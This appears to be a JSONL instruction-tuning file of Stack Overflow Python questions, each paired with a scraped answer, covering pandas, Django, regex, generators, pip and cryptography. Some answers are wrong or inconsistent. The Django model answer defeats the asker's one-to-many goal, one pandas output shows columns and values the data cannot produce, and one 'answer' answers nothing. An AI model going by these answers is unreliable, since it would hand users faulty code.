'PART2': None}, 'UNLIMITED': {'POSSIBILITIES': {'LIKE': None, 'THIS': None}}}}\n<\/code><\/pre>\n\n<p>Now you have a regular Python object which you can iterate through and do string manipulation. You can write a recursive function that concatenates your string:<\/p>\n\n<pre><code>&gt;&gt;&gt; def create_output(dict_element, result):\n...     if dict_element == None:\n...         print(result)\n...         return\n...     for key, value in dict_element.items():\n...         create_output(value, result + key)\n...\n&gt;&gt;&gt; create_output(my_dict, \"\")\nEXAMPLETEST\nEXAMPLEANOTHERPART1\nEXAMPLEANOTHERPART2\nEXAMPLEUNLIMITEDPOSSIBILITIESLIKE\nEXAMPLEUNLIMITEDPOSSIBILITIESTHIS\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I normalize a dict inside a CSV?<p>I have a CSV file which contains a dict value.<\/p>\n<pre><code>Test.CSV\n\nid,name,contact,Location\n1,Julie,&quot;[{&quot;&quot;name&quot;&quot;:&quot;&quot;Jenny Brown&quot;&quot;,&quot;&quot;relation&quot;&quot;:&quot;&quot;mother&quot;&quot;,&quot;&quot;number&quot;&quot;:2113131313},{&quot;&quot;name&quot;&quot;:&quot;&quot;Jorge&quot;&quot;,&quot;&quot;relation&quot;&quot;:&quot;&quot;brother&quot;&quot;,&quot;&quot;number&quot;&quot;:121313131}]&quot;,US\n2,Jim,&quot;[{&quot;&quot;name&quot;&quot;:&quot;&quot;Sana&quot;&quot;,&quot;&quot;relation&quot;&quot;:&quot;&quot;sister&quot;&quot;,&quot;&quot;number&quot;&quot;:83279131}]&quot;,UK\n\n<\/code><\/pre>\n<p>I want to normalize this CSV. Expected output:<\/p>\n<pre><code>id , name, contact_name,contact_realation,contact_number,location\n1,Julie,Jenny Brown,mother,2113131313,US\n1,Julie,Jorge,brother,121313131,US\n2,Jim,Sana,sister,83279131,UK\n<\/code><\/pre>\n<p>I have loaded the data using CSV reader but I am not able to normalize the contact value. How can I do that?<\/p>\n<pre><code>csvfile = csv.reader(open(filename, encoding=&quot;utf8&quot;))\n<\/code><\/pre>\n<p>So far I tried this:<\/p>\n<pre><code>df=pd.read_csv(filename, converters={'contact':json.loads}, header=0)\ncontact_df = pd.io.json.json_normalize(df['contact'])\n<\/code><\/pre>\n<p>but getting the below error:<\/p>\n<pre><code>AttributeError: 'list' object has no attribute 'values'\n<\/code><\/pre>","output_text":"<p>The function <code>pd.io.json.json_normalize<\/code> is used to work with <code>JSON<\/code> objects directly. But it seems you want to work with <code>pd.Series<\/code> directly. A nice trick is to map the value to a <code>Series<\/code> or <code>Dataframe<\/code>. Then you can use <code>concat<\/code> to create the contact dataframe, with mutliple index. Finally, you merger it back to the original dataframe.<\/p>\n<pre><code>df=pd.read_csv(filename, converters={'contact':json.loads}, header=0)\ndf.index.name = 'row_id'\nconcat_df = df.merge(\n    pd.concat(df[&quot;contact&quot;].apply(pd.DataFrame).tolist(), keys=df.index),\n    left_index=True, right_index=True\n).drop(&quot;contact&quot;,1) \n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>          id name_x Location       name_y relation      number     role\nrow_id                                                                 \n0      0   1  Julie       US  Jenny Brown   mother  2113131313      NaN\n       1   1  Julie       US        Jorge      NaN   121313131  brother\n1      0   2    Jim       UK         Sana   sister    83279131      NaN\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n one to many relationship not showing in admin<p>I was making a post system with two models <code>Post<\/code> and <code>Image<\/code>. I want one post to have multiple images<\/p>\n<p>Here is my models<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class Post(models.Model):\n    id = models.UUIDField(primary_key=True, default=uuid.uuid4)\n    content = models.CharField(max_length=150, null=False)\n    images = models.ManyToOneRel(\n        field=&quot;image&quot;, to=&quot;Image&quot;, field_name=&quot;images&quot;)\n\n\nclass Image(models.Model):\n    id = models.UUIDField(primary_key=True, default=uuid.uuid4)\n    image = models.ImageField()\n    post = models.ForeignKey(\n        Post, on_delete=models.CASCADE, related_name=&quot;images&quot;)\n<\/code><\/pre>\n<p>When I checked it in admin the images field is not shown.<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/loik6.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/loik6.png\" alt=\"admin\" \/><\/a><\/p>\n<p>I am not entirely sure how to use ManyToOneRel in django. So far what I understood is I need  my post saved before i can add an image. Is there any other way I can have multiple images for one post<\/p>","output_text":"<p>you only want one relation,in my opinion Foriegn key is better<\/p>\n<p>Just try this:-<\/p>\n<pre><code>class Post(models.Model):\nid = models.UUIDField(primary_key=True, default=uuid.uuid4)\ncontent = models.CharField(max_length=150, null=False)\nimage=models.ForeignKey(Image,on_delete=models.SET_NULL,null=True)\n\n\nclass Image(models.Model):\nid = models.UUIDField(primary_key=True, default=uuid.uuid4)\nimage = models.ImageField()\n<\/code><\/pre>\n<p><strong>Note:- 'Foreign-key itself is a Many-To-One Relation'<\/strong><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Remove markdown code block from python string<p>I'm trying to remove markdown code blocks from the following string:<\/p>\n<pre><code>Problem with encoding a very large BigInteger or BigDecimal without fraction\n\nWe have an issue to encode a very large BigDecimal. For example, when I tried to encode _7.533938258014959827307132527342E+545_ I got the following error:\n\n``` java\nError com.n1analytics.paillier.EncodeException: Input value cannot be encoded.\nat com.n1analytics.paillier.StandardEncodingScheme.encode(StandardEncodingScheme.java:115)\nat com.n1analytics.paillier.StandardEncodingScheme.encode(StandardEncodingScheme.java:239)\n...\n```\n\nThe reason why I got the error is as follows:\n<\/code><\/pre>\n<p>I've tried:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>txt = re.sub('(```[a-z]*\\n[\\s\\S]*?\\n```)', '', txt) # https:\/\/regex101.com\/r\/aA5bI3\/3\ntxt = re.sub('(```.+?```)', '', txt)  # https:\/\/regex101.com\/r\/aA5bI3\/3\n<\/code><\/pre>\n<p>Even though I saw some of these regex at <a href=\"https:\/\/coderwall.com\/p\/r6b4xg\/regex-to-match-github-s-markdown-code-blocks\" rel=\"nofollow noreferrer\">https:\/\/coderwall.com\/p\/r6b4xg\/regex-to-match-github-s-markdown-code-blocks<\/a> and <a href=\"https:\/\/regex101.com\/r\/aA5bI3\/3\" rel=\"nofollow noreferrer\">https:\/\/regex101.com\/r\/aA5bI3\/3<\/a>, I had no success<\/p>","output_text":"<p>The first pattern almost works, but in the example data there is a space before <code> java<\/code><\/p>\n<p>If the spaces and the chars a-z are the only acceptable characters after the backticks and they are optional, you could match optional whitespace chars without a newline <code>[^\\S\\r\\n]*<\/code><\/p>\n<p>The pattern could look like<\/p>\n<pre><code>```[^\\S\\r\\n]*[a-z]*\\n.*?\\n```\n<\/code><\/pre>\n<p>Instead of using <code>[\\s\\S]*?<\/code> you can use the <code>re.DOTALL<\/code> flag to make the dot match a newline.<\/p>\n<p><a href=\"https:\/\/regex101.com\/r\/vIHoIA\/1\" rel=\"nofollow noreferrer\">Regex demo<\/a> | <a href=\"https:\/\/ideone.com\/0mrcJe\" rel=\"nofollow noreferrer\">Python demo<\/a><\/p>\n<p>For example<\/p>\n<pre><code>txt = re.sub(r&quot;```[^\\S\\r\\n]*[a-z]*\\n.*?\\n```&quot;, '', txt, 0, re.DOTALL)\n<\/code><\/pre>\n<hr>\n<p>If the backticks always begin at the start of the string, and also end at the start of the string, you could make the pattern a bit more efficient matching all the lines in between that do not start with 3 backticks using a negative lookahead to prevent unnecessary backtracking.<\/p>\n<p>As the pattern uses an anchor, you should use the <code>re.MULTILINE<\/code> flag.<\/p>\n<pre><code>^```[^\\S\\r\\n]*[a-z]*(?:\\n(?!```$).*)*\\n```\n<\/code><\/pre>\n<p><strong>Explanation<\/strong><\/p>\n<ul>\n<li><code>^<\/code> Start of string<\/li>\n<li><code>```<\/code> Match 3 backticks<\/li>\n<li><code>[^\\S\\r\\n]*[a-z]*<\/code> Match optional spaces without a newline and optional chars a-z<\/li>\n<li><code>(?:<\/code> Non capture group\n<ul>\n<li><code>\\n(?!```$)<\/code> Match a newline and assert that the line does not start with 3 backticks<\/li>\n<li><code>.*<\/code> If that is the case, match the whole line<\/li>\n<\/ul>\n<\/li>\n<li><code>)*<\/code> Close non capture group and repeat 0+ times to match all lines<\/li>\n<li><code>\\n```<\/code> Match a newline and 3 backticks<\/li>\n<\/ul>\n<p><a href=\"https:\/\/regex101.com\/r\/DcjApD\/1\" rel=\"nofollow noreferrer\">Regex demo<\/a> | <a href=\"https:\/\/ideone.com\/VC0jet\" rel=\"nofollow noreferrer\">Python demo<\/a><\/p>\n<p>For example<\/p>\n<pre><code>txt = re.sub(r&quot;^```[^\\S\\r\\n]*[a-z]*(?:\\n(?!```$).*)*\\n```&quot;, '', txt, 0, re.MULTILINE)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n python dataframe .duplicated returns multiple occurrences for same value<p>Given a following dataframe:<\/p>\n<pre><code>import pandas as pd\n\ndf = pd.DataFrame({'month': [2, 2, 1, 1, 2, 10],\n                   'year': [2017, 2017, 2020, 2020, 2018, 2019],\n                   'sale': [60, 45, 90, 20, 28, 36],\n                   'title': ['Ones', 'Twoes', 'Three', 'Four', 'Five', 'Six']})\n<\/code><\/pre>\n<p>I am trying to get duplicates in <code>month<\/code> columnn.<\/p>\n<pre><code>df[df.duplicated(subset=['month'])]\n<\/code><\/pre>\n<p>By default, <code>keep=&quot;first&quot;<\/code><\/p>\n<p>But this is giving two occurrences for month <code>2<\/code>.<\/p>\n<pre><code>   month  year  sale  title\n1      2  2017    45  Twoes\n3      1  2020    20   Four\n4      2  2018    28   Five\n<\/code><\/pre>\n<p>I'm confused with the output. Am I missing something here?<\/p>","output_text":"<p>Ouput is filter all duplicates with remove first dupe.<\/p>\n<p>If need first dupes only invert mask and chain mask for filter only dupes with <code>keep=False<\/code> parameter:<\/p>\n<pre><code>df1 = df[~df.duplicated(subset=['month']) &amp; df.duplicated(subset=['month'], keep=False)]\nprint (df1)\n   month  year  sale  title\n0      2  2017    60   Ones\n2      1  2020    90  Three\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why are commands inside of generator functions not executed?<p>When you create a generator object in python like this:<\/p>\n\n<pre><code>def gen():\n    print(\"Hello\")\n    yield 1\n\nx=gen()\n\nprint(x)\n<\/code><\/pre>\n\n<p>the only console output will be: &lt; generator object gen at xxx>. Why does it not print \"Hello\" as well? If you change the gen function to just return a value instead of a generator (so change out \"yield\" with \"return\"), the print command is executed so that the console output is:<\/p>\n\n<p>Hello<br>\n&lt; generator object gen at xxx><\/p>\n\n<p>Why does that happen? How can I execute commands inside of generator functions?<\/p>","output_text":"<p>There is a famous statement: everything in Python is an object. So when do this, you just assign generator to variable, that's it. You can do the similar with functions:<\/p>\n\n<pre><code>&gt;&gt;&gt; def func():\n...     pass\n... \n&gt;&gt;&gt; x = func\n&gt;&gt;&gt; x\n&lt;function func at 0x7f78f03662d0&gt;\n<\/code><\/pre>\n\n<p>If you want to use the generating values, you should iterate through it, so for example:<\/p>\n\n<pre><code>&gt;&gt;&gt; def gen():\n&gt;&gt;&gt;     yield 1\n&gt;&gt;&gt;     yield 2\n&gt;&gt;&gt; list(gen())\n[1, 2]\n<\/code><\/pre>\n\n<p>In your case just use <code>next()<\/code>:<\/p>\n\n<pre><code>&gt;&gt;&gt; def gen():\n&gt;&gt;&gt;     print(\"Hello\")\n&gt;&gt;&gt;     yield 1\n&gt;&gt;&gt; x=gen()\n&gt;&gt;&gt; print(next(x))\nhello\n1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Combine two lists by each element<p>I am new to python and want to combine\/merge two lists by element like this:<\/p>\n<p><strong>Input<\/strong><\/p>\n<pre><code>list = ['blue', 'red', 'green'] \nlist2= ['trousers', 'shirt', 'pants'] \n<\/code><\/pre>\n<p><strong>Desired Output<\/strong><\/p>\n<pre><code>desired list= ['blue trousers', 'blue shirt', 'blue pants', 'red trouser', 'red shirt', 'red pants',         'green trouser', 'green shirt', 'green pants']\n<\/code><\/pre>\n<p>I have researched stackoverflow and there came up the itertools library and the cartesian product.\nSo I tried this:<\/p>\n<pre><code>from itertools import product \n  \ndef cartesian_product(arr1, arr2): \n  \n    # return the list of all the computed tuple \n    # using the product() method \n    return list(product(arr1, arr2))  \n    \n# Driver Function  \nif __name__ == &quot;__main__&quot;:  \n    arr1 = ['blue', 'red', 'green'] \n    arr2 = ['trouser', 'shirt', 'pants'] \n    print(cartesian_product(arr1, arr2)) \n<\/code><\/pre>\n<p>This is the output which comes close (but packing the results into tuples instead of elements):<\/p>\n<pre><code>[('blue', 'trouser'), ('blue', 'shirt'), ('blue', 'pants'), ('red', 'trouser'), ('red', 'shirt'), ('red', 'pants'), ('green', 'trouser'), ('green', 'shirt'), ('green', 'pants')]\n<\/code><\/pre>\n<p>Any suggestion how I get to the desired output from there?<\/p>","output_text":"<p>You could do it using the following technique (no use of itertools):<\/p>\n<pre><code>list1 = ['blue', 'red', 'green'] \nlist2 = ['trousers', 'shirt', 'pants']\ndesired_list = []\n\nfor colour in list1:\n    for garment in list2:\n        desired_list.append(colour + ' ' + garment)\n<\/code><\/pre>\n<p>For each element in the first list, this iterates through each element in the second list, giving the following output:<\/p>\n<pre><code>['blue trousers', 'blue shirt', 'blue pants', 'red trousers', 'red shirt',\n'red pants', 'green trousers', 'green shirt', 'green pants']\n<\/code><\/pre>\n<p>Apologies if there is a more efficient way of doing this! I hope this helps.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n ipython version conflict while installing mermaid and ipykernel using pip<p>In order to use Mermaid in a IPython Notebook I have to install <code>nb-mermaid<\/code> according to <a href=\"https:\/\/pypi.org\/project\/nb-mermaid\/0.1.0\/\" rel=\"nofollow noreferrer\">this<\/a>. Unfortunately, it uninstall the previous version of installed <code>ipython<\/code> package, which has actually newer version.<\/p>\n<pre><code>Installing collected packages: IPython, nb-mermaid\n  Attempting uninstall: IPython\n    Found existing installation: ipython 8.2.0\n    Uninstalling ipython-8.2.0:\n      Successfully uninstalled ipython-8.2.0\nERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.\nipykernel 6.11.0 requires ipython&gt;=7.23.1, but you have ipython 3.2.3 which is incompatible.\nSuccessfully installed IPython-3.2.3 nb-mermaid-0.1.0\n<\/code><\/pre>\n<p>It downgrades <code>ipython-8.2.0<\/code> to <code>ipython-3.2.3<\/code>. And actually there is still an open issue about <a href=\"https:\/\/github.com\/bollwyvl\/nb-mermaid\/issues\/7\" rel=\"nofollow noreferrer\">this<\/a>.<\/p>\n<p>Then to resolve the problem I try to upgrade the <code>ipython<\/code> package.<\/p>\n<pre><code>Installing collected packages: ipython\n  Attempting uninstall: ipython\n    Found existing installation: ipython 3.2.3\n    Uninstalling ipython-3.2.3:\n      Successfully uninstalled ipython-3.2.3\nERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.\nnb-mermaid 0.1.0 requires IPython&lt;4.0,&gt;3.0, but you have ipython 8.2.0 which is incompatible.\nSuccessfully installed ipython-8.2.0\n<\/code><\/pre>\n<p>And another problem comes up for dependency of <code>nb-mermaid<\/code>. As summary<\/p>\n<div class=\"s-table-container\">\n<table class=\"s-table\">\n<thead>\n<tr>\n<th style=\"text-align: left;\">Package<\/th>\n<th style=\"text-align: left;\">Date<\/th>\n<th style=\"text-align: left;\">Dependency<\/th>\n<th style=\"text-align: left;\">Version<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><code>nb-mermaid-0.1.0<\/code><\/td>\n<td style=\"text-align: left;\"><code>28 Jul 2015<\/code><\/td>\n<td style=\"text-align: left;\"><code>ipython<\/code><\/td>\n<td style=\"text-align: left;\"><code>&lt;4.0<\/code>, <code>&gt;3.0<\/code><\/td>\n<\/tr>\n<tr>\n<td style=\"text-align: left;\"><code>ipykernel-6.11.0<\/code><\/td>\n<td style=\"text-align: left;\"><code>31 Mar 2022<\/code><\/td>\n<td style=\"text-align: left;\"><code>ipython<\/code><\/td>\n<td style=\"text-align: left;\"><code>&gt;=7.23.1<\/code><\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<\/div>\n<p>which shows that there is not any overlap version available to install both <code>nb-mermaid-0.1.0<\/code> and <code>ipykernel-6.11.0<\/code>.<\/p>\n<p>Is there any workaround to solve this problem?<\/p>","output_text":"<blockquote>\n<p>I have to install <code>nb-mermaid<\/code> according to <a href=\"https:\/\/pypi.org\/project\/nb-mermaid\/0.1.0\/\" rel=\"nofollow noreferrer\">this<\/a><\/p>\n<\/blockquote>\n<p>It's no wonder that <a href=\"https:\/\/github.com\/bollwyvl\/nb-mermaid\" rel=\"nofollow noreferrer\">that project<\/a> includes some very old dependencies: it hasn't been touched in nearly 6 years and has been abandoned by the author. Personally, I'd avoid using it at all.<\/p>\n<p>Unfortunately, I don't see any good modern alternatives on a quick search.<\/p>\n<p>If you really want to use it, I suggest you use the latest commit from the <code>master<\/code> branch where <a href=\"https:\/\/github.com\/bollwyvl\/nb-mermaid\/commit\/a2c9168d8cb661a1c5517f9f3432ba7f4d9c21a7#diff-6341be4dfdb52ffdfac24972f1ad4cc38cb939111e2b8d0ead789fe0e82f982dL20-R20\" rel=\"nofollow noreferrer\">the <code>&lt;4.0<\/code> constraint on <code>IPython<\/code> was removed<\/a>:<\/p>\n<pre><code>pip install git+https:\/\/github.com\/bollwyvl\/nb-mermaid.git@103502e6\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to insert data to database from third-part API with Pymysql\/Python?<p>How to insert real-time data to database from third-party API with Pymysql\/Python?<\/p>\n<p>I am trying to request data from a third-party API,<\/p>\n<p>we got the API link like below\nGET \/api\/v4\/dblines<\/p>\n<p>How to insert real-time data to database from third-party API with Pymysql\/Python, use requests, pymysql and pandas?\nWe have to insert data from 2020.01.01<\/p>\n<p>Below is the sample JSON data from this sample link:\n<code>https:\/\/api.example.com\/api\/v4\/dblines?a=ABC123&amp;b=1min<\/code><\/p>\n<pre><code>    [\n    1593649440000, start_time\n    &quot;2.9923453200&quot;,\n    &quot;2.9923453200&quot;,\n    &quot;2.0045299700&quot;,\n    &quot;2.0045299700&quot;,\n    &quot;2.2400009700&quot;,\n    1593649499999, end_time\n    &quot;2.0010870500&quot;,\n    2,\n    &quot;2.0300009700&quot;,\n    &quot;2.0001359600&quot;,\n    &quot;0&quot;\n    ],\n    [\n    1593649500000,\n    &quot;2.9923453297&quot;,\n    &quot;2.9923453297&quot;,\n    &quot;2.9923453297&quot;,\n    &quot;2.9923453297&quot;,\n    &quot;25.950000970&quot;,\n    1593649559999,\n    &quot;2.1176054000&quot;,\n    4,\n    &quot;25.950000970&quot;,\n    &quot;2.1176054000&quot;,\n    &quot;0&quot;\n    ],\n    [\n    1593649560000,\n    &quot;2.9923453297&quot;,\n    &quot;2.9923453297&quot;,\n    &quot;2.9923453297&quot;,\n    &quot;2.9923453297&quot;,\n    &quot;2.0000009718&quot;,\n    1593649619999,\n    &quot;1.00000097&quot;,\n    0,\n    &quot;1.00000097&quot;,\n    &quot;1.00000097&quot;,\n    &quot;0&quot;\n    ],\n<\/code><\/pre>","output_text":"<p>Here is an example:<\/p>\n<pre><code>from sqlalchemy import create_engine\nimport pandas as pd\nimport requests\n\n# getting json using requests\n# data = requests.get('https:\/\/api.example.com\/api\/v4\/dblines?a=ABC123&amp;b=1min').json()\n# data example\ndata = [\n    [\n        1593649440000,\n        &quot;2.9923453200&quot;,\n        &quot;2.9923453200&quot;,\n        &quot;2.0045299700&quot;,\n        &quot;2.0045299700&quot;,\n        &quot;2.2400009700&quot;,\n        1593649499999,\n        &quot;2.0010870500&quot;,\n        2,\n        &quot;2.0300009700&quot;,\n        &quot;2.0001359600&quot;,\n        &quot;0&quot;\n    ],\n    [\n        1593649500000,\n        &quot;2.9923453297&quot;,\n        &quot;2.9923453297&quot;,\n        &quot;2.9923453297&quot;,\n        &quot;2.9923453297&quot;,\n        &quot;25.950000970&quot;,\n        1593649559999,\n        &quot;2.1176054000&quot;,\n        4,\n        &quot;25.950000970&quot;,\n        &quot;2.1176054000&quot;,\n        &quot;0&quot;\n    ]\n]\n\n# create df using json from API\ndf = pd.DataFrame(\n    data,\n    columns=[\n        # change aliases to column names here...\n        'start_time',\n        'alias1',\n        'alias2',\n        'alias3',\n        'alias4',\n        'alias5',\n        'end_time',\n        'alias6',\n        'alias7',\n        'alias8',\n        'alias9',\n        'alias10',\n    ]\n)\n# drop unnecessary columns, duplicates, processing df, blabla etc...\n# and init db connection\nengine = create_engine('mysql+pymysql:\/\/{user}:{pw}@localhost\/{db}'\n                       .format(user='db_user',\n                               pw='db_password',\n                               db='db_name'))\n# insert df into db using connection \n# change if_exists if you need\ndf.to_sql(con=engine, name='table_name_here', if_exists='replace')\n<\/code><\/pre>\n<p>See comments. Hope this helps.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n \"Could not deserialize key data\" when serializing public key<p>I'm trying to load a public key using the &quot;cryptography&quot; module, and it looks like I am copying the code they have exactly (posted <a href=\"https:\/\/cryptography.io\/en\/latest\/hazmat\/primitives\/asymmetric\/rsa\/#key-loading\" rel=\"nofollow noreferrer\">here<\/a>) with only a few minor changes:<\/p>\n<pre><code>from cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives import hashes, serialization\n\ndef encrypt(message, publicKeyPath):\n  with open(publicKeyPath, 'rb') as keyFile:\n    privateKey = serialization.load_pem_private_key(\n      keyFile.read(),\n      password=None,\n      backend=default_backend()\n    )\n\n  print(privateKey)\n\nmessage = 'This message will be encrypted'\n\npublicKeyPath = '\/(path to key)\/My First Key_public.pem'\n\nencryptedMessage = encrypt(message, publicKeyPath)\n<\/code><\/pre>\n<p>However, I keep getting the error &quot;Could not deserialize key data.&quot; Here is the full traceback:<\/p>\n<pre><code>Traceback (most recent call last):\n  File &quot;\/Users\/max.s.haberman\/Documents\/Code\/Experiments\/Encryption\/encryption2.py&quot;, line 23, in &lt;module&gt;\n    encryptedMessage = encrypt(message, publicKeyPath)\n  File &quot;\/Users\/max.s.haberman\/Documents\/Code\/Experiments\/Encryption\/encryption2.py&quot;, line 9, in encrypt\n    backend=default_backend()\n  File &quot;\/Library\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python3.7\/site-packages\/cryptography\/hazmat\/primitives\/serialization\/base.py&quot;, line 16, in load_pem_private_key\n    return backend.load_pem_private_key(data, password)\n  File &quot;\/Library\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python3.7\/site-packages\/cryptography\/hazmat\/backends\/openssl\/backend.py&quot;, line 1186, in load_pem_private_key\n    password,\n  File &quot;\/Library\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python3.7\/site-packages\/cryptography\/hazmat\/backends\/openssl\/backend.py&quot;, line 1411, in _load_key\n    self._handle_key_loading_error()\n  File &quot;\/Library\/Frameworks\/Python.framework\/Versions\/3.7\/lib\/python3.7\/site-packages\/cryptography\/hazmat\/backends\/openssl\/backend.py&quot;, line 1465, in _handle_key_loading_error\n    raise ValueError(&quot;Could not deserialize key data.&quot;)\nValueError: Could not deserialize key data.\n<\/code><\/pre>\n<p>Here is the public key I am using, which has worked well in other places:<\/p>\n<pre><code>-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkaqpgfRRZa0H8A7v3ebJ\nz+lM+j0Jdw2xftUoIDmGWkrQ0vJXnkCwP\/zcALI\/mgAlMtr4KDSrE0n7\/+1u1uB+\nDuhdjuGhu5EAAdA+N1yMOCRNfYRJFpAtQLO2qu6h6wU1HmVLIK87kyTAoVcn+HIX\n4uMiQbNG7PH2Cv+VaQvA91I\/tTcSkY\/ZrGTYcFHa0k+sSGxqQDW7C7mu5RKssxAa\nQCSnAUOjV+j1lUMvWYr8qs5yI4wRsFH6sP6m2\/Ksrj1i3+DSOWJOy\/WQs1e1CBcA\ncVfyM+dflllneNkF6rnB0n2wIE4TeRatzy6AlSjQ7FohSkAfOMW6GwszVhEFSAu2\n4QIDAQAB\n-----END PUBLIC KEY-----\n<\/code><\/pre>\n<p>Am I missing something? Is there something else I need to do? It looks like other StackOverflow users have had this issue, but I don't think their situations applied to me, since my key does not include <a href=\"https:\/\/stackoverflow.com\/questions\/49909957\/could-not-deserialize-key-data-with-python3\">spaces<\/a>, a working public key has already been <a href=\"https:\/\/stackoverflow.com\/questions\/53337833\/could-not-deserialize-key-data-on-decoding-jwt-python\">created<\/a>, etc. Any help is appreciated. Thanks in advance!<\/p>","output_text":"<p>The linked code refers to the <em>private<\/em> key. But for the encryption you need the <em>public<\/em> key (the <em>private<\/em> key is required for decryption):<\/p>\n<pre><code>publicKey = serialization.load_pem_public_key(\n    keyFile.read(),\n    backend=default_backend()\n)\n    \n<\/code><\/pre>\n<p>The posted key seems to be OK. It is a PEM encoded public key in PKCS8 format.<\/p>\n<p>An example for the (still missing) encryption can be found <a href=\"https:\/\/cryptography.io\/en\/latest\/hazmat\/primitives\/asymmetric\/rsa\/#encryption\" rel=\"nofollow noreferrer\">here<\/a>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to split a dataframe based on dummy variables<p>I've been checking different questions similar to this one but I didn't find the answer, the only one I found a bit similar was <a href=\"https:\/\/stackoverflow.com\/questions\/9713294\/split-data-frame-based-on-levels-of-a-factor-into-new-data-frames\" title=\"Split data.frame based on levels of a factor into new data.frames\">this article<\/a>.<\/p>\n<p>I have a dataframe &quot;df&quot; with some variables called &quot;OrigenDestino&quot;, &quot;Operaci\u00f3n&quot; and &quot;Tipo Buque&quot;. I used the function pd.get_dummies:<\/p>\n<pre><code>dum_df = pd.get_dummies(df_notimestamp, columns=[&quot;OrigenDestino&quot;], prefix=[&quot;Origen and Destino are&quot;] )\ndum_df = pd.get_dummies(dum_df, columns=[&quot;Operaci\u00f3n&quot;], prefix=[&quot;Operaci\u00f3n is&quot;])\ndum_df = pd.get_dummies(dum_df, columns=[&quot;Tipo Buque&quot;], prefix=[&quot;Tipo Buque is&quot;])\n<\/code><\/pre>\n<p>Now I have a bigger dataframe with this variables split. What I want to do now is split this dataframe into smaller dataframes based on these variables. For example, I like to have a dataframe where variable: &quot;Tipo Buque is_Ro-Ro Cargo Ship&quot;==1 and &quot;&quot;Tipo Operaci\u00f3n is Salida&quot;==1.<\/p>\n<p>Tipo Buque is_Ro-Ro Cargo Ship&quot; are dummy variables &quot;&quot;Tipo Operaci\u00f3n is Salida&quot;<\/p>\n<p>Thank you!<\/p>","output_text":"<p>I found a workaround in this article (<a href=\"https:\/\/stackoverflow.com\/questions\/17071871\/how-do-i-select-rows-from-a-dataframe-based-on-column-values\">How do I select rows from a DataFrame based on column values?<\/a>). I'd like to do it automatically based on some dummy variables but looks like I'm not able to do it.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Compare list of tuples against column in dataframe<p>I'm learning pandas and I have a problem I can't solve.<\/p>\n<p>I have a dataframe with around 200k rows, being one of the columns an id. It looks like this:<\/p>\n<pre><code>    call_id id      utterance   channel  seq    sentiment\n0     uuid            str         str    str      float\n<\/code><\/pre>\n<p>I also have a list of tuples with this shape:<\/p>\n<pre><code>(id, pattern_id)\ntup = [('c638b6fe-0939-4a3b-a7f0-c9b315da1e5d', '56e1542f-5d68-4fe0-a85a-cce8ae1f0b94'),...]\n<\/code><\/pre>\n<p>being these elements strings.<\/p>\n<p>I'd like to compare the id in each row of the dataframe against the ids in the list of tuples and, if there is match, add the pattern_id of the matching tuple to a new column in the dataframe. <strong>The length of the list of tuples is not equal to the number of rows in the dataframe.<\/strong><\/p>\n<p>I've tried different methods but any of them worked fine.\nIt seems I'm able to make the comparison, for example:<\/p>\n<pre><code>matches = []\nfor row in df.itertuples():\n    for t in tuples:\n        if row.id == t[0]:\n            matches.append(t[1])\n<\/code><\/pre>\n<p>and I get the matches I have to get. But if I add an else the comparison doesn't seem to work:<\/p>\n<pre><code>matches = []\nfor row in df.itertuples():\n    for t in tuples:\n        if row.id == t[0]:\n            matches.append(t[1])\n        else:\n            matches.append(&quot;nan&quot;)\n<\/code><\/pre>\n<p>I would appreciate any help to understand:<\/p>\n<ul>\n<li>why this is not working<\/li>\n<li>how to add the result of the comparison per row to a new column in the dataframe.<\/li>\n<\/ul>\n<p>Thanks!<\/p>","output_text":"<p>You can make a dataframe out of list of tuples, like this:\n<code>df = pd.DataFrame(list_of_tuples, columns =['id', 'pattern_id'])<\/code>\nand then join it with the main dataframe, like this:\n<code>joined = main_df.merge(df, on='id', how='inner')<\/code>. The <code>pattern_id<\/code> is included in <code>joined<\/code> for rows having matched <code>id<\/code>.<\/p>"}
